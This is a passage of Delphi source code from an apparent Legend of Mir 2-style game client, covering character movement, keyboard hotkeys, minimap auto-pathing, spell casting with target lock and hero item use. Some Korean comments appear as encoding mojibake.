              If g_boCanStartRun Or (g_nRunReadyCount >= 1) Then
              Begin
                crun := g_MySelf.CanRun;
                //骑马开始

                If (g_MySelf.m_btHorse <> 0)
                  And (GetDistance(mx, my, dx, dy) >= 3)
                  And (crun > 0)
                  And IsUnLockAction(CM_HORSERUN, ndir) Then
                Begin
                  GetNextHorseRunXY(ndir, mx, my);
                  If PlayScene.CanRun(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mx,
                    my) Then
                  Begin
                    g_MySelf.UpdateMsg(CM_HORSERUN, mx, my, ndir, 0, 0, '', 0);
                    g_dwLastMoveTick := GetTickCount;
                  End
                  Else
                  Begin //如果跑失败则跳回去走
                    g_ChrAction := caWalk;
                    Goto TTTT;
                  End;
                End
                Else
                Begin

                  //骑马结束
                  If (GetDistance(mx, my, dx, dy) >= 2) And (crun > 0) Then
                  Begin
                    If IsUnLockAction(CM_RUN, ndir) Then
                    Begin
                      GetNextRunXY(ndir, mx, my);
                      If PlayScene.CanRun(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
                        mx, my) Then
                      Begin
                        g_MySelf.UpdateMsg(CM_RUN, mx, my, ndir, 0, 0, '', 0);
                        g_dwLastMoveTick := GetTickCount;
                      End
                      Else
                      Begin //如果跑失败则跳回去走
                        g_ChrAction := caWalk;
                        Goto TTTT;
                      End;
                    End
                    Else
                      g_nTargetX := -1;
                  End
                  Else
                  Begin
                    //Jacky
                    mdir := GetNextDirection(g_MySelf.m_nCurrX,
                      g_MySelf.m_nCurrY, dx, dy);
                    If mdir <> g_MySelf.m_btDir Then
                      g_MySelf.SendMsg(CM_TURN, g_MySelf.m_nCurrX,
                        g_MySelf.m_nCurrY, mdir, 0, 0, '', 0);
                    g_nTargetX := -1;
                    //Jacky
                     //if crun = -1 then begin
                        //DScreen.AddSysMsg ('瘤陛篮 钝 荐 绝嚼聪促.');
                        //TargetX := -1;
                     //end;
                    Goto LB_WALK;
                    {if crun = -2 then begin
                       DScreen.AddSysMsg ('泪矫饶俊 钝 荐 乐嚼聪促.');
                       TargetX := -1;
                    end; }
                  End;
                End; //骑马结束
              End
              Else
              Begin
                Inc(g_nRunReadyCount);
                Goto LB_WALK;
              End;
            End;
        End;
      End;
    End;
    g_nTargetX := -1; //茄锅俊 茄沫究..
    If g_MySelf.RealActionMsg.Ident > 0 Then
    Begin
      FailAction := g_MySelf.RealActionMsg.Ident; //角菩且锭 措厚
      FailDir := g_MySelf.RealActionMsg.Dir;
      If g_MySelf.RealActionMsg.Ident = CM_SPELL Then
      Begin
        SendSpellMsg(g_MySelf.RealActionMsg.Ident,
          g_MySelf.RealActionMsg.X,
          g_MySelf.RealActionMsg.Y,
          g_MySelf.RealActionMsg.Dir,
          g_MySelf.RealActionMsg.State);
      End
      Else
        SendActMsg(g_MySelf.RealActionMsg.Ident,
          g_MySelf.RealActionMsg.X,
          g_MySelf.RealActionMsg.Y,
          g_MySelf.RealActionMsg.Dir);
      g_MySelf.RealActionMsg.Ident := 0;

      //皋春甫 罐篮饶 10惯磊惫 捞惑 吧栏搁 磊悼栏肺 荤扼咙
      If g_nMDlgX <> -1 Then
        If (abs(g_nMDlgX - g_MySelf.m_nCurrX) >= 8) Or (abs(g_nMDlgY -
          g_MySelf.m_nCurrY) >= 8) Then
        Begin
          FrmDlg.CloseMDlg;
          g_nMDlgX := -1;
        End;
      If g_nShopX <> -1 Then
        If (abs(g_nShopX - g_MySelf.m_nCurrX) >= 8) Or (abs(g_nShopY -
          g_MySelf.m_nCurrY) >= 8) Then
        Begin
          FrmDlg.DSelfShop2.Visible := False;
          g_nShopX := -1;
        End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ProcessActionMessages');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.FormKeyDown(Sender: TObject; Var Key: Word;
  Shift: TShiftState);
Resourcestring
  sFTest1 = '[%s]已被加入好友列表';
  sFTest2 = '[%s]已被移出好友列表';
  sBTest1 = '[%s]已被加入黑名单列表';
  sBTest2 = '[%s]已被移出黑名单列表';
Var
  //  msg, wc, dir, mx, my: integer;
  ini: TIniFile;
  str: String;
  I: integer;
Begin
  Try //程序自动增加
    //DScreen.AddChatBoardString (IntToStr(Key), clBlue, clWhite);
    Case Key Of
      VK_PAUSE:
        Begin
          Key := 0;
          PrintScreenNow();
        End;
     End;

    If g_DWinMan.KeyDown(Key, Shift) Then
      exit;

    If (g_MySelf = Nil) Or (DScreen.CurrentScene <> PlayScene) Then
      exit;
    //  mx:=g_MySelf.m_nCurrX;
    //  my:=g_MySelf.m_nCurrY;
/////////////////////////////////////自定义热键//////////////////////////////
if  (g_WgInfo.boHookKey) and (Key<>0) then
  if (Shift=TShiftState(g_WgInfo.bHookey1ShiftState)) and (Key=g_WgInfo.bHookey1key) then
   begin
     SendHeroCall; //召唤英雄
     key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey2ShiftState)) and (Key=g_WgInfo.bHookey2key) then
   begin
     If g_HeronRecogId <> 0 Then  //英雄攻击止目标
        SendHeroWatch(False);
      key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey3ShiftState)) and (Key=g_WgInfo.bHookey3key) then
   begin
      If (g_HeronRecogId <> 0) And (GetTickCount > m_CheckTick) Then
      Begin
        m_CheckTick := GetTickCount + 1000;
        SendHeroAllowJoint; //英雄合击
      End;
     key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey4ShiftState)) and (Key=g_WgInfo.bHookey4key) then
   begin
      If g_HeronRecogId <> 0 Then
        SendSay('@RestHero');  //切换英雄状态
      key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey5ShiftState)) and (Key=g_WgInfo.bHookey5key) then
   begin
      If g_HeronRecogId <> 0 Then
        SendHeroWatch(True);  //英雄守护
      key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey6ShiftState)) and (Key=g_WgInfo.bHookey6key) then
   begin
        SendSay('@AttackMode'); //攻击模式切换
        key:=0;
   end else if (Shift=TShiftState(g_WgInfo.bHookey7ShiftState)) and (Key=g_WgInfo.bHookey7key) then
   begin
      if g_nMiniMaxShow then
         FrmDlg.SetMiniMapSize(2)
      else
         FrmDlg.DBotMiniMapClick(nil,0,0);//小地图切换
      key:=0;   
   end;
 ///////////////////////////////////////////////////////////////////////////////////////

    If g_WgInfo.boCloseShift And (ssShift In Shift) Then
    Begin
      g_boShift := Not g_boShift;
      If g_boShift Then
        str := '自动Shift 开'
      Else
        str := '自动Shift 关';
      DScreen.AddChatBoardString(str, clWhite, clBlue);
    End;
{$IF OEMVER   = 1}
    If (ssCtrl In Shift) and (g_WgClass = 0) Then g_WgInfo.boShowAllItem := not g_WgInfo.boShowAllItem;
{$IFEND}
    Case Key Of
      VK_F1, VK_F2, VK_F3, VK_F4,
        VK_F5, VK_F6, VK_F7, VK_F8:
        Begin
          If (GetTickCount - g_dwLatestSpellTick > g_dwSpellTime) And
            ((g_MySelf.m_btHorse = 0) Or g_WgInfo.boAutoDownHorse) And
            (Not g_MySelf.m_boIsShop) Then
          Begin
            If ssCtrl In Shift Then
            Begin
              ActionKey := Key - 100;
            End
            Else
            Begin
              ActionKey := Key;
            End;
            ActionKeyEx := ActionKey;
          End;
          Key := 0;
        End;
      VK_F9:
        Begin
          FrmDlg.OpenItemBag;
        End;
      VK_F10:
        Begin
          FrmDlg.StatePage2 := 0;
          FrmDlg.OpenMyStatus;
          Key := 0;
        End;
      VK_F11:
        Begin
          FrmDlg.StatePage2 := 3;
          FrmDlg.OpenMyStatus;
        End;
      VK_F12:
        Begin
          If g_MySelf <> Nil Then
          Begin
            FrmDlg.ShowWgWindows;
          End;
        End;
      word('H'):
        Begin
          If ssCtrl In Shift Then
          Begin
            SendSay('@AttackMode');
          End;
        End;
      word('A'):
        Begin
          If ssCtrl In Shift Then
          Begin
            SendSay('@Rest');
          End;
        End;
      word('E'):
        Begin
          If ssCtrl In Shift Then
          Begin
            If g_HeronRecogId <> 0 Then
              SendSay('@RestHero');
          End
          Else If ssAlt In Shift Then
          Begin
            If g_FocusCret <> Nil Then
            Begin
              SendDelGroupMember(g_FocusCret.m_sUserName);
            End;
          End;
        End;
      word('F'):
        Begin
          If ssCtrl In Shift Then
          Begin
            If g_nCurFont < MAXFONT - 1 Then
              Inc(g_nCurFont)
            Else
              g_nCurFont := 0;
            g_sCurFontName := g_FontArr[g_nCurFont];
            FrmMain.Font.Name := g_sCurFontName;
            FrmMain.Canvas.Font.Name := g_sCurFontName;
            DxDraw.Surface.Canvas.Font.Name := g_sCurFontName;
            PlayScene.EdChat.Font.Name := g_sCurFontName;

            ini := TIniFile.Create('.\mir.ini');
            If ini <> Nil Then
            Begin
              ini.WriteString('Setup', 'FontName', g_sCurFontName);
              ini.Free;
            End;
          End
          Else If ssAlt In Shift Then
          Begin
            If (g_FocusCret <> Nil) And (g_FocusCret.m_btRace = 0) Then
            Begin
              I := g_MyFriendList.IndexOf(g_FocusCret.m_sUserName);
              If I = -1 Then
              Begin
                //DScreen.AddChatBoardString (Format(sFTest1,[g_FocusCret.m_sUserName]),  clWhite,clBlue);
                g_MyFriendList.Add(g_FocusCret.m_sUserName);
                Dscreen.AddHitMsg(Format(sFTest1, [g_FocusCret.m_sUserName]));
              End
              Else
              Begin
                g_MyFriendList.Delete(I);
                Dscreen.AddHitMsg(Format(sFTest2, [g_FocusCret.m_sUserName]));
                //DScreen.AddChatBoardString (Format(sFTest2,[g_FocusCret.m_sUserName]),  clWhite,clBlue);
              End;
            End;
          End;
        End;
      192:
        Begin
          If Not PlayScene.EdChat.Visible Then
          Begin
            AutoPickUpItem(True); //捡物品
          End;
        End;
      word('X'):
        Begin
          If ssAlt In Shift Then
            AppLogout;
        End;
      word('Q'):
        Begin
          If ssAlt In Shift Then
            AppExit;
          If ssCtrl In Shift Then
            If g_HeronRecogId <> 0 Then
              SendHeroWatch(True);
        End;
      word('W'):
        Begin
          If ssCtrl In Shift Then
          Begin
            If g_HeronRecogId <> 0 Then
              SendHeroWatch(False);
          End
          Else If ssAlt In Shift Then
          Begin
            If g_FocusCret <> Nil Then
            Begin
              If g_GroupMembers.Count = 0 Then
                SendCreateGroup(g_FocusCret.m_sUserName, FrmDlg.m_boAutoGroup)
              Else
                SendAddGroupMember(g_FocusCret.m_sUserName);
            End;
          End;
        End;
      word('S'):
        Begin
          If ssCtrl In Shift Then
          Begin
            If (g_HeronRecogId <> 0) And (GetTickCount > m_CheckTick) Then
            Begin
              m_CheckTick := GetTickCount + 1000;
              SendHeroAllowJoint;
            End;
          End
          Else If ssAlt In Shift Then
          Begin
            If (g_FocusCret <> Nil) And (g_FocusCret.m_btRace = 0) Then
            Begin
              I := g_MyBlacklist.IndexOf(g_FocusCret.m_sUserName);
              If I = -1 Then
              Begin
                g_MyBlacklist.Add(g_FocusCret.m_sUserName);
                //DScreen.AddChatBoardString (Format(sBTest1,[g_FocusCret.m_sUserName]),  clWhite,clBlue);
                Dscreen.AddHitMsg(Format(sBTest1, [g_FocusCret.m_sUserName]));
              End
              Else
              Begin
                g_MyBlacklist.Delete(I);
                Dscreen.AddHitMsg(Format(sBTest2, [g_FocusCret.m_sUserName]));
                //DScreen.AddChatBoardString (Format(sBTest2,[g_FocusCret.m_sUserName]),  clWhite,clBlue);
              End;
            End;
          End;
        End;
      word('R'):
        Begin
          If (ssAlt In Shift) And (GetTickCount > m_CheckTick) Then
          Begin
            m_CheckTick := GetTickCount + 1000;
            SendClientMessage(CM_QUERYBAGITEMS, 0, 0, 0, 0);
          End;
        End;
      word('M'):
        Begin
          If (ssCtrl In Shift) And (g_Myself <> Nil) Then
          Begin
            If g_MySelf.m_btHorse = 0 Then
              SendSay('@骑马')
            Else
              SendSay('@下马');
          End;
        End;

      Word('Z'):
        Begin
          If ssCtrl In Shift Then
          Begin
            //g_boAutoMoveing := not g_boAutoMoveing;
            If Not g_boAutoMoveing Then
            Begin
              If High(g_nMiniMapPath) > 2 Then
              Begin
                g_nMiniMapPath :=
                  FindPath(g_nMiniMapPath[High(g_nMiniMapPath)].X,
                  g_nMiniMapPath[High(g_nMiniMapPath)].Y);
                If High(g_nMiniMapPath) > 2 Then
                Begin
                  DScreen.AddChatBoardString(Format('自动移动开始，使用Ctrl + Z 或者 点击鼠标停止移动！', [g_nMiniMapPath[High(g_nMiniMapPath)].X,
                    g_nMiniMapPath[High(g_nMiniMapPath)].Y]), GetRGB(180),
                    clWhite);
                  g_boAutoMoveing := True;
                End
                Else
                  DScreen.AddChatBoardString('无法到达终点！',
                    GetRGB(56), clWhite);
              End
              Else
                DScreen.AddChatBoardString(Format('尚未设置终点目标，右键点击小地图!', [g_nMiniMapMosX, g_nMiniMapMosY]), GetRGB(180), clWhite);
            End
            Else
            Begin
              g_boAutoMoveing := False;
              DScreen.AddChatBoardString(Format('自动移动停止',
                [g_nMiniMapMosX, g_nMiniMapMosY]), GetRGB(180), clWhite);
            End;

            //g_boShowAllItem := not g_boShowAllItem;
          End;
        End;
    End;

    Case Key Of
      VK_UP:
        With DScreen Do
        Begin
          If ChatBoardTop > 0 Then
            Dec(ChatBoardTop);
        End;
      VK_DOWN:
        With DScreen Do
        Begin
          If ChatBoardTop < ChatStrs.Count - 1 Then
            Inc(ChatBoardTop);
        End;
      VK_PRIOR:
        With DScreen Do
        Begin
          If ChatBoardTop > VIEWCHATLINE Then
            ChatBoardTop := ChatBoardTop - VIEWCHATLINE
          Else
            ChatBoardTop := 0;
        End;
      VK_NEXT:
        With DScreen Do
        Begin
          If ChatBoardTop + VIEWCHATLINE < ChatStrs.Count - 1 Then
            ChatBoardTop := ChatBoardTop + VIEWCHATLINE
          Else
            ChatBoardTop := ChatStrs.Count - 1;
          If ChatBoardTop < 0 Then
            ChatBoardTop := 0;
        End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.FormKeyDown'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.FormKeyPress(Sender: TObject; Var Key: Char);
Var
  sname: String;
  ii: integer;
Begin
  Try //程序自动增加
    If g_DWinMan.KeyPress(Key) Then
      exit;
    If DScreen.CurrentScene = PlayScene Then
    Begin
      If PlayScene.EdChat.Visible Then
      Begin
        //傍烹栏肺 贸府秦具 窍绰 版快父 酒贰肺 逞绢皑
        exit;
      End;
      Case byte(key) Of
        byte('1')..byte('6'):
          Begin
            sname := g_ItemArr[byte(key) - byte('1')].S.Name;
            EatItem(byte(key) - byte('1'));
            if (g_ItemArr[byte(key) - byte('1')].Dura<=1) and (g_ItemArr[byte(key) - byte('1')].S.StdMode=0) then
            begin
              II := GetItembyName(sName);
              If (II = -1) Or (ii In [0..5]) Then
                pAutoOpenItem(sName);
            end;
          End;
        27: //ESC
          Begin
          End;
        byte('M'),byte('m'):
         begin
          if g_nMiniMaxShow then
             FrmDlg.SetMiniMapSize(2)
          else
             FrmDlg.DBotMiniMapClick(nil,0,0);
         end;
      {$IF TOOLVER     = DEFVER}
        byte('G'),byte('g'):
         begin
          if not frmDlgConfig.Showing then
          frmDlgConfig.Open;
         end;
        {$IFEND}
        byte(' '), 13: //盲泼 冠胶
          Begin
            PlayScene.EdChat.Visible := TRUE;
            PlayScene.EdChat.SetFocus;
            SetImeMode(PlayScene.EdChat.Handle, LocalLanguage);
            If FrmDlg.BoGuildChat Then
            Begin
              PlayScene.EdChat.Text := '!~';
              PlayScene.EdChat.SelStart := Length(PlayScene.EdChat.Text);
              PlayScene.EdChat.SelLength := 0;
            End
            Else
            Begin
              PlayScene.EdChat.Text := '';
            End;
          End;
        byte('@'),
          byte('!'),
          byte('/'):
          Begin
            PlayScene.EdChat.Visible := TRUE;
            PlayScene.EdChat.SetFocus;
            SetImeMode(PlayScene.EdChat.Handle, LocalLanguage);
            If key = '/' Then
            Begin
              If WhisperName = '' Then
                PlayScene.EdChat.Text := key
              Else If Length(WhisperName) > 2 Then
                PlayScene.EdChat.Text := '/' + WhisperName + ' '
              Else
                PlayScene.EdChat.Text := key;
              PlayScene.EdChat.SelStart := Length(PlayScene.EdChat.Text);
              PlayScene.EdChat.SelLength := 0;
            End
            Else
            Begin
              PlayScene.EdChat.Text := key;
              PlayScene.EdChat.SelStart := 1;
              PlayScene.EdChat.SelLength := 0;
            End;
          End;
      End;
      //key := #0;
      //if Sender<>FormWgMain then key := #0;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.FormKeyPress'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
begin
If g_DWinMan.KeyUp(Key, Shift) Then
      exit;
end;

Procedure TfrmMain.FormShow(Sender: TObject);
Begin
  ShowWindow(application.Handle, SW_HIDE);
End;

procedure TfrmMain.GetAutoMovingXY;
var
  I : Integer;
  Actor : TActor;
  Count : Integer;
label
  LB_WALK;
begin
  Count := 0;
  LB_WALK:
  if High(g_nMiniMapPath) > 1 then
  begin
    if (g_MySelf.m_nCurrX = g_nMiniMapPath[0].X) and
       (g_MySelf.m_nCurrY = g_nMiniMapPath[0].Y) then
    begin
      DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,1);
    end else
    if (g_MySelf.m_nCurrX = g_nMiniMapPath[1].X) and
       (g_MySelf.m_nCurrY = g_nMiniMapPath[1].Y) then
    begin
      DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,2);
    end;
    if CheckBeeline(g_MySelf.m_nCurrX,g_MySelf.m_nCurrY,g_nMiniMapPath[1].X,g_nMiniMapPath[1].Y) then
    begin
      g_ChrAction := caRun;
      g_nTargetX := g_nMiniMapPath[1].X;
      g_nTargetY := g_nMiniMapPath[1].Y;
      if (not PlayScene.CanRunEx(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, g_nTargetX, g_nTargetY)) or
         (GetDistance(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, g_nTargetX, g_nTargetY) <= 1) then
      begin
        g_ChrAction := caWalk;
        g_nTargetX := g_nMiniMapPath[0].X;
        g_nTargetY := g_nMiniMapPath[0].Y;
      end;
    end
    else
    begin
      g_ChrAction := caWalk;
      g_nTargetX := g_nMiniMapPath[0].X;
      g_nTargetY := g_nMiniMapPath[0].Y;
    end;
    if g_ChrAction = caWalk then
    begin
      if not PlayScene.CanWalkEx2(g_nTargetX,g_nTargetY) then
      begin
        for i := PlayScene.m_ActorList.Count - 1 downto 0 do
        begin
          Actor := TActor(PlayScene.m_ActorList[i]);
          if not actor.m_boDeath  then
          begin
            g_LegendMap.MapData[Actor.m_nCurrX, Actor.m_nCurrY].TerrainType := not g_LegendMap.MapData[Actor.m_nCurrX, Actor.m_nCurrY].TerrainType;
          end;
        end;
        g_nMiniMapPath := FindPath(g_nMiniMapPath[High(g_nMiniMapPath)].X,g_nMiniMapPath[High(g_nMiniMapPath)].Y);
        for i := PlayScene.m_ActorList.Count - 1 downto 0 do
        begin
          Actor := TActor(PlayScene.m_ActorList[i]);
          if not actor.m_boDeath  then
          begin
            g_LegendMap.MapData[Actor.m_nCurrX, Actor.m_nCurrY].TerrainType := not g_LegendMap.MapData[Actor.m_nCurrX, Actor.m_nCurrY].TerrainType;
          end;
        end;
        if High(g_nMiniMapPath) > 0 then
        begin
          Inc(Count);
          if Count > 5 then
          begin
            DScreen.AddChatBoardString('移动已停止，无法到达终点！',GetRGB(180), clWhite);
            g_boAutoMoveing := False;
            exit;
          end;
          goto LB_WALK
        end
        else
        begin
          DScreen.AddChatBoardString('移动已停止，无法到达终点！',GetRGB(180), clWhite);
          g_boAutoMoveing := False;
          exit;
        end;
      end;
    end;
  end
  else
  begin
    if (High(g_nMiniMapPath) = -1)  then
    begin
      DScreen.AddChatBoardString(Format('已到达终点(%d,%d)！',[g_MySelf.m_nCurrX,g_MySelf.m_nCurrY]),GetRGB(56), clWhite);
      //DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,1);
      g_nMiniMapPath := nil;
      g_boAutoMoveing := False;
      exit;
    end;
    if (g_MySelf.m_nCurrX = g_nMiniMapPath[0].X) and
       (g_MySelf.m_nCurrY = g_nMiniMapPath[0].Y) then
    begin
      DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,1);
    end;
    if (High(g_nMiniMapPath) = -1)  then
    begin
      DScreen.AddChatBoardString(Format('已到达终点(%d,%d)！',[g_MySelf.m_nCurrX,g_MySelf.m_nCurrY]),GetRGB(56), clWhite);
      //DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,1);
      g_nMiniMapPath := nil;
      g_boAutoMoveing := False;
      exit;
    end;
    g_ChrAction := caWalk;
    g_nTargetX := g_nMiniMapPath[0].X;
    g_nTargetY := g_nMiniMapPath[0].Y;
    if not PlayScene.CanWalkEx2(g_nTargetX,g_nTargetY) then
    begin
      DScreen.AddChatBoardString('移动已停止，无法到达终点！',GetRGB(180), clWhite);
      DynArrayDelete(g_nMiniMapPath,SizeOf(TPoint),0,1);
      g_nMiniMapPath := nil;
      g_boAutoMoveing := False;
    end;
  end;
end;

Function TfrmMain.GetMagicByKey(Key: char): PTClientMagic;
Var
  i: integer;
  pm: PTClientMagic;
Begin
  Result := Nil;
  For i := 0 To g_MagicList.Count - 1 Do
  Begin
    pm := PTClientMagic(g_MagicList[i]);
    If pm.Key = Key Then
    Begin
      Result := pm;
      break;
    End;
  End;
End;

Procedure TfrmMain.UseMagic(tx, ty: integer; pcm: PTClientMagic; boFlag:
  Boolean); //tx, ty: 胶农赴 谅钎烙.
Var
  tdir, targx, targy, targid: integer;
  pmag: PTUseMagicInfo;
  //   nCheckCode:Byte;
Begin
  If pcm = Nil Then
    exit;
  If g_MySelf.m_boIsShop Or (g_MySelf.m_btHorse <> 0) Then
    exit;
  If (pcm.Def.wSpell + pcm.Def.btDefSpell <= g_MySelf.m_Abil.MP) Or
    (pcm.Def.btEffectType = 0) Then
  Begin
    If pcm.Def.btEffectType = 0 Then
    Begin

      //if CanNextAction and ServerAcceptNextAction then begin
      If pcm.Def.wMagicId = SKILL_FIRESWORD Then
      Begin
        If GetTickCount - g_dwLatestFireHitTick < 10 * 1000 Then
        Begin
          exit;
        End;
      End;

      If pcm.Def.wMagicId = SKILL_73 Then
      Begin
        If GetTickCount - g_dwLatestLongFireHitTick < 10 * 1000 Then
        Begin
          exit;
        End;
      End;

      If pcm.Def.wMagicId = 27 Then
      Begin
        If GetTickCount - g_dwLatestRushRushTick < 3 * 1000 Then
        Begin
          exit;
        End;
      End;
      If GetTickCount - g_dwLatestSpellTick > g_dwSpellTime {500} Then
      Begin
        g_dwLatestSpellTick := GetTickCount;
        g_dwMagicDelayTime := 0;
        SendSpellMsg(CM_SPELL, g_MySelf.m_btDir {x}, 0, pcm.Def.wMagicId, 0);
      End;

    End
    Else
    Begin

      tdir := GetFlyDirection(390, 175, tx, ty);
      //         MagicTarget := FocusCret;
      //魔法锁定
              { if (pcm.Def.wMagicId = 2)
                 or (pcm.Def.wMagicId = 14)
                 or (pcm.Def.wMagicId = 15)
                 or (pcm.Def.wMagicId = 19) then begin
                 g_MagicTarget:=g_FocusCret;
               end else begin
                 if not g_WgInfo.boMagicLock or (PlayScene.IsValidActor (g_FocusCret) and (not g_FocusCret.m_boDeath)) then begin
                   g_MagicLockActor:=g_FocusCret;
                 end;
                 g_MagicTarget:=g_MagicLockActor;
               end; }

      If (g_MagicLockActor <> Nil) And (g_MagicLockActor.m_boDeath) Then
        g_MagicLockActor := Nil;

      If g_WgInfo.boMagicLock And g_ClientWgInfo.boMagicLock And (Not
        (pcm.Def.wMagicId In [2, 14, 15, 19, 22, 29,82, { 33, 37,38,47,} 52])) Then
      Begin

        If g_Wginfo.boMagicFixupLock Then
        Begin //绝对锁定

          If (Not PlayScene.IsValidActor(g_FocusCret)) And (Not
            g_FocusCret.m_boDeath) Then
          Begin
            g_MagicLockActor := g_FocusCret;
          End;

        End
        Else
        Begin //相对锁定
          If (g_FocusCret <> Nil) And (Not g_FocusCret.m_boDeath) Then
            g_MagicLockActor := g_FocusCret;
        End;

        g_MagicTarget := g_MagicLockActor;
      End
      Else
        g_MagicTarget := g_FocusCret;
      If boFlag Then
        g_MagicTarget := g_MySelf;

      If Not PlayScene.IsValidActor(g_MagicTarget) Then
        g_MagicTarget := Nil;

      If g_MagicTarget = Nil Then
      Begin
        PlayScene.CXYfromMouseXY(tx, ty, targx, targy);
        targid := 0;

      End
      Else
      Begin

        targx := g_MagicTarget.m_nCurrX;
        targy := g_MagicTarget.m_nCurrY;
        targid := g_MagicTarget.m_nRecogId;
      End;

      If CanNextAction And ServerAcceptNextAction Then
      Begin

        g_dwLatestSpellTick := GetTickCount; //付过 荤侩
        new(pmag);
        FillChar(pmag^, sizeof(TUseMagicInfo), #0);
        pmag.EffectNumber := pcm.Def.btEffect;
        pmag.MagicSerial := pcm.Def.wMagicId;
        pmag.ServerMagicCode := 0;
        g_dwMagicDelayTime := 200 + pcm.Def.dwDelayTime;
        //促澜 付过阑 荤侩且锭鳖瘤 浆绰 矫埃

        Case pmag.MagicSerial Of
          //0, 2, 11, 12, 15, 16, 17, 13, 23, 24, 26, 27, 28, 29: ;
          2, 14, 15, 16, 17, 18, 19, 21, //厚傍拜 付过 力寇
          12, 25, 26, 28, 29, 30, 31: ;
        Else
          g_dwLatestMagicTick := GetTickCount;
        End;

        //荤恩阑 傍拜窍绰 版快狼 掉饭捞
        g_dwMagicPKDelayTime := 0;

        If g_MagicTarget <> Nil Then
          If g_MagicTarget.m_btRace = 0 Then
            g_dwMagicPKDelayTime := 300 + Random(1100);
        //(600+200 + MagicDelayTime div 5);

  // if pcm.Def.wMagicID in [6,13..19,30,38,52] then
        If g_wgInfo.boCanAutoAmyounsul Then
          TaosAutoAmyounsul(pcm.Def.wMagicID);

        g_MySelf.SendMsg(CM_SPELL, targx, targy, tdir, Integer(pmag), targid,
          '', 0);

      End; // else
      //Dscreen.AddSysMsg ('泪矫饶俊 荤侩且 荐 乐嚼聪促.');
   //Inc (SpellCount);
    End;
  End
  Else
    Dscreen.AddSysMsg('没有足够的魔法点数。');
  //ell) + '+' + IntToStr(pcm.Def.btDefSpell) + '/' +IntToStr(g_MySelf.m_Abil.MP));
End;

Procedure TfrmMain.UseMagicSpell(who, effnum, targetx, targety, magic_id:
  integer);
Var
  actor: TActor;
  adir: integer;
  UseMagic: PTUseMagicInfo;
Begin
  Try //程序自动增加
    actor := PlayScene.FindActor(who);
    If actor <> Nil Then
    Begin
      adir := GetFlyDirection(actor.m_nCurrX, actor.m_nCurrY, targetx, targety);
      new(UseMagic);
      FillChar(UseMagic^, sizeof(TUseMagicInfo), #0);
      UseMagic.EffectNumber := effnum;
      UseMagic.ServerMagicCode := 0;
      UseMagic.MagicSerial := magic_id;
      UseMagic.ClientType := TMagicType(LoByte(effnum));
      //Dscreen.AddSysMsg (IntToStr(LoByte(effnum)));
      actor.SendMsg(SM_SPELL, 0, 0, adir, Integer(UseMagic), 0, '', 0);
      Inc(g_nSpellCount);
    End
    Else
      Inc(g_nSpellFailCount);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.UseMagicSpell'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.UseMagicFire(who, efftype, effnum, targetx, targety, target:
  integer);
Var
  actor: TActor;
  //   adir,
  sound: integer;
  //   pmag: PTUseMagicInfo;
Begin
  Try //程序自动增加
    sound := 0; //jacky
    actor := PlayScene.FindActor(who);
    If actor <> Nil Then
    Begin
      //
      actor.SendMsg(SM_MAGICFIRE, target {111magid}, efftype, effnum, targetx,
        targety, '', sound);
      //efftype = EffectType
      //effnum = Effect

      //if actor = Myself then Dec (SpellCount);
      If g_nFireCount < g_nSpellCount Then
        Inc(g_nFireCount);
    End;
    g_MagicTarget := Nil;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.UseMagicFire'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.UseMagicFireFail(who: integer);
Var
  actor: TActor;
Begin
  Try //程序自动增加
    actor := PlayScene.FindActor(who);
    If actor <> Nil Then
    Begin
      actor.SendMsg(SM_MAGICFIRE_FAIL, 0, 0, 0, 0, 0, '', 0);
    End;
    g_MagicTarget := Nil;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.UseMagicFireFail'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.HeroEatItem(idx: integer);
Begin
  Try //程序自动增加
    If idx In [0..MAXBAGITEMCL - 1] Then
    Begin
      If (g_HeroEatingItem.S.Name <> '') And (GetTickCount - g_dwHeroEatTime > 5
        * 1000) Then
      Begin
        g_HeroEatingItem.S.Name := '';
      End;
      If (g_HeroEatingItem.S.Name = '') And (g_HeroItemArr[idx].S.Name <> '')
        Then
      Begin
        g_HeroEatingItem := g_HeroItemArr[idx];
        if (g_HeroItemArr[idx].Dura>1) and (g_HeroItemArr[idx].S.StdMode=0)then
          dec(g_HeroItemArr[idx].Dura)
        else 
          g_HeroItemArr[idx].S.Name := '';

        If (g_HeroItemArr[idx].S.StdMode = 4) And (g_HeroItemArr[idx].S.Shape <
          100) Then
        Begin

          If g_HeroItemArr[idx].S.Shape < 50 Then
          Begin
            If mrYes <> FrmDlg.DMessageDlg('[' + g_HeroItemArr[idx].S.Name +
              '] 你想让英雄开始训练吗？', [mbYes, mbNo]) Then
            Begin
              g_HeroItemArr[idx] := g_HeroEatingItem;
              exit;
            End;
          End
          Else
          Begin
            If mrYes <> FrmDlg.DMessageDlg('[' + g_HeroItemArr[idx].S.Name +
              '] 你想让英雄开始训练吗？', [mbYes, mbNo]) Then
            Begin
              g_HeroItemArr[idx] := g_HeroEatingItem;
              exit;
            End;
          End;
        End;
        g_dwHeroEatTime := GetTickCount;
